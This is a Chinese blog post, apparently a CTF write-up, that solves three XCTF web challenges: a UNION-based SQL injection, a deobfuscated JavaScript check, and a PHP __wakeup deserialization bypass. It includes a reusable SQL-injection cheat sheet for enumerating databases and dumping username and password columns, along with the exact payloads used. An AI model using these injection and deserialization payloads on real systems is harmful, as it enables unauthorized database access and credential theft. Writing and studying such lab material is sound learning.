@@ -1,0 +1,1157 @@
+<!DOCTYPE HTML>
+<html lang="zh_Cn">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解, 123">
+    <meta name="description" content="攻防世界web题解">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解 | kingkb</title>
+    <link rel="icon" type="image/png" href="/medias/logo1.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="kingkb" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo1.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">kingkb</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo1.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">kingkb</div>
+        <div class="logo-desc">
+            
+            no game no life
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://kingofkb.github.io/medias/cover/zzjsfcka3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf-SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-ctf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">ctf-SQL注入联合查询 ctf-反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2021-12-05
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-08-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    6 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="攻防世界web高手进阶区Newscenter-NaNNaNNaNNaN-Batman-unserialize3题解"><a href="#攻防世界web高手进阶区Newscenter-NaNNaNNaNNaN-Batman-unserialize3题解" class="headerlink" title="攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解"></a>攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解</h1><h2 id="Newscenter"><a href="#Newscenter" class="headerlink" title="Newscenter"></a>Newscenter</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="MySQL中information-scheme库"><a href="#MySQL中information-scheme库" class="headerlink" title="MySQL中information_scheme库"></a>MySQL中information_scheme库</h4><p>SCHEMATA：SCHEMA_NAME<br>TABLES：TABLE_SCHEMA， TABLE_NAME<br>COLUMNS：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME</p>
+<h4 id="MySQL中UNION规则"><a href="#MySQL中UNION规则" class="headerlink" title="MySQL中UNION规则"></a>MySQL中UNION规则</h4><p>1.UNION必须由两条或两条以上的SELECT语句组成，语句之间用关键字UNION分隔。<br>2.UNION中的每个查询必须包含相同的列。<br>3.UNION会从查询结果集中自动去除了重复行。<br>4.利用前提：页面上有显示位。</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.判断列数:</p>
+<pre class=" language-SQL"><code class="language-SQL">order by n
+#列数小于n时回显正常
+</code></pre>
+<p>2.判断显示位(后文皆以列数为3为例)</p>
+<pre class=" language-SQL"><code class="language-SQL">union select 1,2,3
+</code></pre>
+<p>3.获取当数据库名称和当前连接数据库的用户</p>
+<pre class=" language-SQL"><code class="language-SQL">union select 1,2,database()
+union select 1,2,user()
+</code></pre>
+<p>4.列出所有数据库</p>
+<pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来库名
+union select 1,2,schema_name from information_schema.schemata limit 0,1
+#group_concat 一次性全部显示
+union select 1,2,group_concat(schema_name) from information_schema.schemata
+</code></pre>
+<p>5.列出(数据库：test)中所有的表</p>
+<pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来字段名
+union select 1,2,table_name from information_schema.tables where table_schema=‘test’ limit 0,1
+#group_concat 一次性全部显示
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x674657374
+#注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。（在20211126~20211127的NCTF上也有一道需要绕过单引号的题）
+</code></pre>
+<p>6.列出（数据库：test;表：admin ）中所有的字段</p>
+<pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来
+union select 1,2,column_name from information_schema.columns where
+table_schema=‘test’ and table_name=‘admin’ limit 0,1
+#group_concat 一次性全部显示
+union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x74657374 and table_name=0x61646d696e
+</code></pre>
+<p>7.列出（数据库：test;表：admin;字段:username,passwd）中的数据</p>
+<pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来
+union select 1,2,(select username,passwd from test.admin limit 0,1)
+#group_concat 一次性全部显示
+union select 1,2,(select group_concat(concat(username,0x20,passwd))) from test.admin
+#0x20对应的为' '方便区分两数据
+</code></pre>
+<h3 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h3><p>进入题目后发现是SQL中的UNION联合查询。首先构造payload来判断列数：</p>
+<pre class=" language-SQL"><code class="language-SQL">1' order by n #
+</code></pre>
+<p>直到n=4时回显错误，故列长为3。<br>构造payload判断显示位：</p>
+<pre class=" language-SQL"><code class="language-SQL">union select 1,2,3
+</code></pre>
+<p>列出所有数据库：</p>
+<pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #
+</code></pre>
+<p>回显为information_schema和news。<br>列出(数据库：news)中所有的表：</p>
+<pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news' #
+</code></pre>
+<p>回显为news和secret_table。<br>列出（数据库：news;表：secret_table ）中所有的字段：</p>
+<pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='news' and table_name='secret_table' #
+</code></pre>
+<p>回显为id和fl4g，显然flag在fl4g中。<br>列出（数据库：news;表：secret_table;字段:fl4g）中的数据</p>
+<pre class=" language-SQL"><code class="language-SQL">union select 1,2,(select group_concat(concat(fl4g))) from news.secret_table #
+</code></pre>
+<p>得到flag。</p>
+<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p><em><strong>eval()</strong></em> 函数用来执行一个字符串表达式，并返回表达式的值。<br>***alert()***函数可创造一个弹窗，并显示表达式。</p>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>下载附件，解压，得到一个名称为web100无后缀的文件，建议是不急着加后缀名啥的，直接用记事本直接打开，可得代码如下：<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232520897-1980531531.png"><br>看不出来代码的用途，但从script可看出和script有关。尝试在浏览器中打开，发现只有一个输入框。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232546093-962913534.png"><br>在记事本中将eval(<em>)改为alert(</em>)重新在浏览器中打开得到：<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232609919-1698904556.png"><br>整理得：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+<span class="token keyword">var</span> e<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">16</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/^be0f23/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/233ac/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/e98aa$/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/c7be9/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+                <span class="token punctuation">{</span>
+                    <span class="token keyword">var</span> t<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"fl"</span><span class="token punctuation">,</span><span class="token string">"s_a"</span><span class="token punctuation">,</span><span class="token string">"i"</span><span class="token punctuation">,</span><span class="token string">"e}"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">var</span> n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"_h0l"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">var</span> r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"g{"</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"_0"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">var</span> i<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"it'"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">var</span> s<span class="token operator">=</span><span class="token punctuation">[</span>t<span class="token punctuation">,</span>n<span class="token punctuation">,</span>r<span class="token punctuation">,</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> o<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>o<span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token operator">++</span>o<span class="token punctuation">)</span>
+                    <span class="token punctuation">{</span>
+                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>o<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        s<span class="token punctuation">[</span>o<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;input id="c">&lt;button onclick=$()>Ok&lt;/button>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">delete</span> _
+</code></pre>
+<p>发现其中五个判断：<br>1.一共有16个字符<br>2.开头必须是be0f23<br>3.必须含有233ac和c7be9<br>4.必须以e98aa结束<br>可构造payload：be0f233ac7be98aa<br>最后再将代码的alert(<em>)改回eval(</em>)，在提交框中输入payload即可得到flag。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232638652-1161924991.png"></p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><p>php魔术方法下列方法名被认为是魔术方法： <em><strong>__construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 __debugInfo()</strong></em> 。<br><strong>注意</strong>：<br>1.除了 <em><strong>__construct()<em><strong>，</strong></em>__destruct()</strong></em> ，和 <em><strong>__clone()</strong></em> 之外的所有魔术方法都必须声明为 public，否则会发出 E_WARNING。 在 PHP 8.0.0 之前没有为魔术方法 <em><strong>__sleep()<em><strong>、 <em><strong>__wakeup()</strong></em> 、</strong></em>__serialize()</strong></em> 、<em><strong>__unserialize()</strong></em> 、<em><strong>__set_state()</strong></em> 发出诊断信息。<br>2.如果定义魔术方法时使用类型声明，它们必须与本文档中描述的签名相同，否则会发出致命错误。 在 PHP 8.0.0 之前，不会发出诊断信息。 然而，<em><strong>__construct()</strong></em> 和<em><strong>__destruct()</strong></em> 不能声明返回类型， 否则会发出致命错误。</p>
+<h5 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">array</span>
+<span class="token keyword">public</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>void
+</code></pre>
+<p>***serialize()<em><strong>函数会检查是否存在</strong></em>__sleep()<em><strong>函数，如果存在，该方法会被优先调用。<br>与之相反，</strong></em>unserialize()<em><strong>会检查是否存在一个</strong></em>__wakeup()<em><strong>方法。如果存在，则会先调用</strong></em>__wakeup()***方法，预先准备对象需要的资源。<br>具体的魔术方法可参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
+<h4 id="wakeup-函数的漏洞"><a href="#wakeup-函数的漏洞" class="headerlink" title="__wakeup()函数的漏洞"></a>__wakeup()函数的漏洞</h4><p>***__wakeup()***漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。譬如：O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。</p>
+<h3 id="题目详解-1"><a href="#题目详解-1" class="headerlink" title="题目详解"></a>题目详解</h3><p>访问目标网址，根据***__wakeup()***魔术方法和题目名字，可以猜到这里是用到了php反序列化<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232842987-1714956926.png"><br>将代码copy并进行补全</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">xctf</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token operator">?</span>code<span class="token operator">=</span>
+</code></pre>
+<p>我们知道<em><strong>unserialize()<em><strong>会检查是否存在一个 <em><strong>__wakeup()</strong></em> 方法。如果存在，则会先调用 <em><strong>__wakeup()</strong></em> 方法，预先准备对象需要的资源。 所以我们需要绕过</strong></em>__wakeup()</strong></em><br>构造脚本：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">xctf</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>运行得到O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}，于是利用***__wakeup()***的漏洞，将1改为2，并将其作为code的值传入即可得到flag。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232904634-1876216497.png"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">kingkb</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://kingofkb.github.io/2021/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BANewscenter(SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)NaNNaNNaNNaN-Batmanunserialize3%E9%A2%98%E8%A7%A3/">http://kingofkb.github.io/2021/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BANewscenter(SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)NaNNaNNaNNaN-Batmanunserialize3%E9%A2%98%E8%A7%A3/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">kingkb</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf-SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-ctf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">ctf-SQL注入联合查询 ctf-反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
